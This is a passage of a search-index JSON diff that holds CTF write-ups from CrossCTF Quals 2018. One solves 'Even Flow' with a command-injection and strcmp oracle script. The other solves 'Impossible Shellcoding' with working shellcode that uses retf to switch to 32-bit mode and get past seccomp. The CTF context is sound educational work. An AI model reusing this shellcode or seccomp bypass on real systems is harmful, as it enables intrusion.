flag\n, which will let us know how far away is the first differing character from the actual flag. \n\n\nWith this information, we can keep \"correcting\" our flag until we get the actual flag.\n\n\nScript\n\n\nWe can write a script to automate this process.\n\n\nfrom pwn import *\n\ndef tryf(flag):\n    p = remote('ctf.pwn.sg', 1601)\n\n    p.sendlineafter('Flag: ', flag)\n    p.sendlineafter('Shell: ', '$?')\n\n    # returns the return value of evenflow\n    return int(p.recvline())\n\n# The Idea:\n# Basically, we compare the actual flag to \n0\n,\n# Then adjust it based on the output of strcmp (the exit code)\n# e.g. to \nC\n, then add a \n0\n =\n \nC0\n\n# and repeat till we get \n}\n, the end of the flag\n\ns = \n0\n\nwhile True:\n    i = tryf(s)\n\n    # adjust!\n    c = chr(ord('0')+i)\n    s = s[:-1] + c\n\n    if s[-1] == '}':\n        print(s)\n        break\n\n    s+='0'", 
+            "title": "Even Flow - CrossCTF Quals 2018 (pwn)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/#even-flow-crossctf-quals-2018-pwn", 
+            "text": "Do you like shell command injection?  nc ctf.pwn.sg 1601  Creator - amon (@nn_amon)", 
+            "title": "Even Flow - CrossCTF Quals 2018 (pwn)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/#challenge", 
+            "text": "We are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings.  First, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\".  sys.stdout.write( Flag:  )\nsys.stdout.flush()\nflag = sys.stdin.readline().strip()\n\nsys.stdout.write( Shell:  )\nsys.stdout.flush()\nshell = sys.stdin.read(2)  The \"flag\" would be passed as an argument into the  evenflow  binary, while the \"shell\" is just being passed to  echo .  os.system( ./evenflow   + flag +  ; echo \\  + shell +  \\ );  We were also given the source of  evenflow , which just reads the flag from a file, and performs  strcmp  on the \"flag\" that we passed in and the actual flag.  size_t get_file_size(char * filename) {\n    struct stat st;\n    stat(filename,  st);\n    return st.st_size;\n}\n\nint main(int argc, char ** argv) {\n    FILE * fd = fopen( flag ,  r );\n    size_t file_size = get_file_size( flag );\n    char * buffer = malloc(file_size);\n    fread(buffer, 1, file_size, fd);\n    return strcmp(buffer, argv[1]);\n}  The interesting part of this code is the last line,  return strcmp(buffer, argv[1]);  According to documentation,  strcmp  will return a number that says how far the first differing character is away from each other.", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/#exploit", 
+            "text": "", 
+            "title": "Exploit"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/#_1", 
+            "text": "In a shell,  $?  contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to  echo , we can just send in  $?  for \"shell\".  So, we can call  echo $?  which will give us the return value of  ./evenflow flag , which will let us know how far away is the first differing character from the actual flag.   With this information, we can keep \"correcting\" our flag until we get the actual flag.", 
+            "title": "$?"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/evenflow/README/#script", 
+            "text": "We can write a script to automate this process.  from pwn import *\n\ndef tryf(flag):\n    p = remote('ctf.pwn.sg', 1601)\n\n    p.sendlineafter('Flag: ', flag)\n    p.sendlineafter('Shell: ', '$?')\n\n    # returns the return value of evenflow\n    return int(p.recvline())\n\n# The Idea:\n# Basically, we compare the actual flag to  0 ,\n# Then adjust it based on the output of strcmp (the exit code)\n# e.g. to  C , then add a  0  =   C0 \n# and repeat till we get  } , the end of the flag\n\ns =  0 \nwhile True:\n    i = tryf(s)\n\n    # adjust!\n    c = chr(ord('0')+i)\n    s = s[:-1] + c\n\n    if s[-1] == '}':\n        print(s)\n        break\n\n    s+='0'", 
+            "title": "Script"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/impossible_shellcoding/README/", 
+            "text": "Impossible Shellcoding - CrossCTF Quals 2018 (pwn)\n\n\n\n\nThe flag is at /flag.txt.\n\n\nnc ctf.pwn.sg 7123\n\n\nCreator - jarsp (@jarsp)\n\n\n\n\nChallenge\n\n\nOpening this up in radare2, we can get the following pseudocode.\n\n\nprctl(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0));\nprctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, \nseccomp_rules, 0, 0);\nchar* buffer = mmap(0x40404000, 0x1000, 7, 0x32);\nread(0, \nbuffer, 0x100);\n\n// runs the shellcode that was read into the buffer\nvoid (*func)() = buffer;\nfunc();\n\n\n\n\nSo, this is a shellcoding challenge, except that it is not so straightforward. There are 2 \nprctl\n calls that are designed to make our life difficult.\n\n\nThe first one prevents us from running the program as other users, by blocking set-user-id and set-group-id functions.\n\n\nThe second one sets up SECCOMP rules, which is a filter to block certain syscalls, based on the syscall number (K in the table below). Using \nseccomp-tools\n, we can get the following table.\n\n\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x00 0xc000003e  /* no-op */\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x0c 0x00 0x40000000  if (A \n= 0x40000000) goto 0016\n 0004: 0x15 0x0b 0x00 0x00000002  if (A == open) goto 0016\n 0005: 0x15 0x0a 0x00 0x00000101  if (A == openat) goto 0016\n 0006: 0x15 0x09 0x00 0x00000055  if (A == creat) goto 0016\n 0007: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0016\n 0008: 0x15 0x07 0x00 0x00000039  if (A == fork) goto 0016\n 0009: 0x15 0x06 0x00 0x0000003a  if (A == vfork) goto 0016\n 0010: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0016\n 0011: 0x15 0x04 0x00 0x00000038  if (A == clone) goto 0016\n 0012: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0016\n 0013: 0x15 0x02 0x00 0x0000009d  if (A == prctl) goto 0016\n 0014: 0x15 0x01 0x00 0x0000009e  if (A == arch_prctl) goto 0016\n 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0016: 0x06 0x00 0x00 0x00000000  return KILL\n\n\n\n\nSECCOMP\n\n\nWe see that \nexecve\n and \nexecveat\n are blocked, which means no shell for us. Ok.\n\n\nAs for ORW (open, read, write) capabilities, \nopen\n and \nopenat\n are blocked so we cannot do the typical procedure of \nopen\ning the file, \nread\ning from the file into a buffer, then finally \nwrite\ning the buffer into standard output. Great.\n\n\nfork\n/\nvfork\n/\nclone\n are blocked, so we can't create new processes that are free of these seccomp restrictions.\n\n\nThere was a \nwriteup\n on a similar challenge, which uses the \nx32 ABI\n. How this works is we can syscall \n0x40000000 + syscall_num_you_actually_want\n to call the syscall and bypass seccomp, due to the x32 ABI of kernels. Sadly at line 0x003, any syscall greater than 0x40000000 is also blocked.\n\n\nSo far, the major problem is that open() and its variants can't be used, however \nread\n/\nwrite\n are still available so we do not need to worry about that.\nThere is another syscall called \nopen_by_handle_at\n that I wanted to use, but for it to work the binary had to be root (I wasted 5 hours on this).\n\n\nretf\n\n\nHowever, there is still one more trick - executing 32-bit code instead. \n\n\nIn 32-bit code, we can use 32-bit syscalls (which have different syscall numbers) to bypass the seccomp filter, as the seccomp filter only blocks the syscall based on its number.\n\n\nTo run 32-bit code from 64-bit code, we can use the \nretf\n instruction which pops 2 values from the stack, the first being the next instruction address and the second being the new value of the CS (Code Segment) register. \n\n\nIf the CS register becomes 0x33, it is executing 64-bit code, whereas if the CS register becomes 0x23, it is executing 32-bit code.\n\n\nOne important thing to take note is, since 32-bit code can only read the lower 32-bits from 64-bit registers, we have to make sure we reset the registers the shellcode uses to lower values (including the instruction pointer register!).\n\n\nExploit\n\n\nThe exploit consists of two parts, firstly, 64-bit shellcode that does the following:\n1. \nmmap\n with low addresses with RWX (read-write-exec) permissions\n2. Read in 32-bit shellcode that opens the file and reads it into the \nmmap\ned memory because the orginal binary only reads in 256 bytes - not enough!\n3. \nretf\n to the mmap'ed memory to run the 32-bit shellcode\n\n\nmmap = '''\nxor rax, rax\nmov al, 9\nmov rdi, 0x602000\nmov rsi, 0x1000\nmov rdx, 7\nmov r10, 0x32\nmov r8, 0xffffffff\nmov r9, 0\nsyscall'''\n\nread = '''\nmov rax, 0\nxor rdi, rdi\nmov rsi, 0x602190\nmov rdx, 100\nsyscall'''\n\nretf = '''\nxor rsp, rsp\nmov esp, 0x602160\nmov DWORD PTR [esp+4], 0x23\nmov DWORD PTR [esp], 0x602190\nretf\n'''\n\nsc = mmap + read + retf\nf = asm(sc)\n\np.sendline(f)\n\n\n\n\nThe second step is just to send in 32-bit shellcode to read the flag.\n\n\n# Send 32-bit shellcode that open-reads the flag and writes to stdout\n# Copied from http://shell-storm.org/shellcode/files/shellcode-73.php\np.sendline(\n\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\n+\n           \n\\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd\n+\n           \n\\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31\n+\n           \n\\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83\n+\n           \n\\xec\\x01\\x8d\\x0c\\x24\\xb2\\x01\\xcd\n+\n           \n\\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0\n+\n           \n\\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83\n+\n           \n\\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff\n+\n           \n\\xff\n+\n           \n/flag.txt\\x00\n)\n\n\n\n\nFinally, \nprint(p.recv())\n to get the flag.", 
+            "title": "Impossible Shellcoding - CrossCTF Quals 2018 (pwn)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/impossible_shellcoding/README/#impossible-shellcoding-crossctf-quals-2018-pwn", 
+            "text": "The flag is at /flag.txt.  nc ctf.pwn.sg 7123  Creator - jarsp (@jarsp)", 
+            "title": "Impossible Shellcoding - CrossCTF Quals 2018 (pwn)"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/impossible_shellcoding/README/#challenge", 
+            "text": "Opening this up in radare2, we can get the following pseudocode.  prctl(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0));\nprctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER,  seccomp_rules, 0, 0);\nchar* buffer = mmap(0x40404000, 0x1000, 7, 0x32);\nread(0,  buffer, 0x100);\n\n// runs the shellcode that was read into the buffer\nvoid (*func)() = buffer;\nfunc();  So, this is a shellcoding challenge, except that it is not so straightforward. There are 2  prctl  calls that are designed to make our life difficult.  The first one prevents us from running the program as other users, by blocking set-user-id and set-group-id functions.  The second one sets up SECCOMP rules, which is a filter to block certain syscalls, based on the syscall number (K in the table below). Using  seccomp-tools , we can get the following table.   line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x00 0xc000003e  /* no-op */\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x0c 0x00 0x40000000  if (A  = 0x40000000) goto 0016\n 0004: 0x15 0x0b 0x00 0x00000002  if (A == open) goto 0016\n 0005: 0x15 0x0a 0x00 0x00000101  if (A == openat) goto 0016\n 0006: 0x15 0x09 0x00 0x00000055  if (A == creat) goto 0016\n 0007: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0016\n 0008: 0x15 0x07 0x00 0x00000039  if (A == fork) goto 0016\n 0009: 0x15 0x06 0x00 0x0000003a  if (A == vfork) goto 0016\n 0010: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0016\n 0011: 0x15 0x04 0x00 0x00000038  if (A == clone) goto 0016\n 0012: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0016\n 0013: 0x15 0x02 0x00 0x0000009d  if (A == prctl) goto 0016\n 0014: 0x15 0x01 0x00 0x0000009e  if (A == arch_prctl) goto 0016\n 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0016: 0x06 0x00 0x00 0x00000000  return KILL", 
+            "title": "Challenge"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/impossible_shellcoding/README/#seccomp", 
+            "text": "We see that  execve  and  execveat  are blocked, which means no shell for us. Ok.  As for ORW (open, read, write) capabilities,  open  and  openat  are blocked so we cannot do the typical procedure of  open ing the file,  read ing from the file into a buffer, then finally  write ing the buffer into standard output. Great.  fork / vfork / clone  are blocked, so we can't create new processes that are free of these seccomp restrictions.  There was a  writeup  on a similar challenge, which uses the  x32 ABI . How this works is we can syscall  0x40000000 + syscall_num_you_actually_want  to call the syscall and bypass seccomp, due to the x32 ABI of kernels. Sadly at line 0x003, any syscall greater than 0x40000000 is also blocked.  So far, the major problem is that open() and its variants can't be used, however  read / write  are still available so we do not need to worry about that.\nThere is another syscall called  open_by_handle_at  that I wanted to use, but for it to work the binary had to be root (I wasted 5 hours on this).", 
+            "title": "SECCOMP"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/impossible_shellcoding/README/#retf", 
+            "text": "However, there is still one more trick - executing 32-bit code instead.   In 32-bit code, we can use 32-bit syscalls (which have different syscall numbers) to bypass the seccomp filter, as the seccomp filter only blocks the syscall based on its number.  To run 32-bit code from 64-bit code, we can use the  retf  instruction which pops 2 values from the stack, the first being the next instruction address and the second being the new value of the CS (Code Segment) register.   If the CS register becomes 0x33, it is executing 64-bit code, whereas if the CS register becomes 0x23, it is executing 32-bit code.  One important thing to take note is, since 32-bit code can only read the lower 32-bits from 64-bit registers, we have to make sure we reset the registers the shellcode uses to lower values (including the instruction pointer register!).", 
+            "title": "retf"
+        }, 
+        {
+            "location": "/crossctf-quals2018/pwn/impossible_shellcoding/README/#exploit", 
+            "text": "The exploit consists of two parts, firstly, 64-bit shellcode that does the following:\n1.  mmap  with low addresses with RWX (read-write-exec) permissions\n2. Read in 32-bit shellcode that opens the file and reads it into the  mmap ed memory because the orginal binary only reads in 256 bytes - not enough!\n3.  retf  to the mmap'ed memory to run the 32-bit shellcode  mmap = '''\nxor rax, rax\nmov al, 9\nmov rdi, 0x602000\nmov rsi, 0x1000\nmov rdx, 7\nmov r10, 0x32\nmov r8, 0xffffffff\nmov r9, 0\nsyscall'''\n\nread = '''\nmov rax, 0\nxor rdi, rdi\nmov rsi, 0x602190\nmov rdx, 100\nsyscall'''\n\nretf = '''\nxor rsp, rsp\nmov esp, 0x602160\nmov DWORD PTR [esp+4], 0x23\nmov DWORD PTR [esp], 0x602190\nretf\n'''\n\nsc = mmap + read + retf\nf = asm(sc)\n\np.sendline(f)  The second step is just to send in 32-bit shellcode to read the flag.  # Send 32-bit shellcode that open-reads the flag and writes to stdout\n# Copied from http://shell-storm.org/shellcode/files/shellcode-73.php\np.sendline( \\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2 +\n            \\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd +\n            \\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31 +\n            \\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83 +\n            \\xec\\x01\\x8d\\x0c\\x24\\xb2\\x01\\xcd +\n            \\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0 +\n            \\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83 +\n            \\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff +\n            \\xff +\n            /flag.txt\\x00 )  Finally,  print(p.recv())  to get the flag.", 
+            "title": "Exploit"
         }
     ]
 }
